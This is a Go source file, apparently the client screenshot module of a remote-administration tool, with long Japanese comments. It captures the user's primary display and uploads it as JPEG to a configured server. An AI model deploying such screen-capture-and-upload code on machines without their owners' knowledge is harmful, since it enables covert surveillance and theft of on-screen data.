//go:build linux || windows || darwin

package screenshot

import (
	"Spark/client/common"
	"Spark/client/config"
	"bytes"
	"errors"
	"image/jpeg"

	"github.com/kbinani/screenshot"
)

/*
Go言語でスクリーンショットを取得し、HTTPリクエストを介してリモートサーバーに送信する機能を実装しています。linux、windows、darwin（macOS）でビルドできるように設定されています。
*/

/*
GetScreenshot 関数
目的: 指定されたディスプレイのスクリーンショットを取得し、リモートサーバーに送信します。
引数:
bridge: サーバーにデータを送信する際に使用する識別子です。
処理の流れ
writer バッファの作成:

bytes.Bufferを作成して、スクリーンショット画像を一時的に格納するメモリバッファを準備しています。
ディスプレイの数を確認:

screenshot.NumActiveDisplays() を使ってアクティブなディスプレイの数を取得します。ディスプレイが存在しない場合 (num == 0)、エラーメッセージ ${i18n|DESKTOP.NO_DISPLAY_FOUND} が返されます。このエラーメッセージは国際化対応用のプレースホルダーです。
スクリーンショットの取得:

screenshot.CaptureDisplay(0) を使用して、最初のディスプレイのスクリーンショットを取得します。
スクリーンショットが正常に取得できなかった場合、エラーを返します。
JPEG形式で画像をエンコード:

取得した画像 (img) を jpeg.Encode 関数を使ってJPEG形式にエンコードし、writer バッファに書き込みます。ここで、JPEGの品質は80に設定されています。
サーバーへの画像送信:

エンコードされた画像データ (writer.Bytes()) をリモートサーバーに送信します。
URLは config.GetBaseURL(false) + '/api/bridge/push' で構成され、common.HTTP.R() でHTTPリクエストを作成し、Put メソッドでデータを送信します。
bridge パラメータは、クエリパラメータとして送信されます。
6. エラーハンドリング:
スクリーンショットの取得やJPEGエンコード、サーバーへの送信のどの段階でもエラーが発生した場合、適切にエラーが返されます。
要点
screenshot ライブラリ: github.com/kbinani/screenshot を使用してスクリーンショットを取得します。
エンコードと送信: 取得した画像をJPEG形式にエンコードし、リモートサーバーに送信します。
クロスプラットフォーム対応: linux、windows、macOS で動作可能です。
このコードは、スクリーンキャプチャを効率的に取得し、ネットワーク経由で送信するための基本的なロジックを提供します。
*/
func GetScreenshot(bridge string) error {
	writer := new(bytes.Buffer)
	num := screenshot.NumActiveDisplays()
	if num == 0 {
		err := errors.New(`${i18n|DESKTOP.NO_DISPLAY_FOUND}`)
		return err
	}
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return err
	}
	err = jpeg.Encode(writer, img, &jpeg.Options{Quality: 80})
	if err != nil {
		return err
	}
	url := config.GetBaseURL(false) + `/api/bridge/push`
	_, err = common.HTTP.R().SetBody(writer.Bytes()).SetQueryParam(`bridge`, bridge).Put(url)
	return err
}
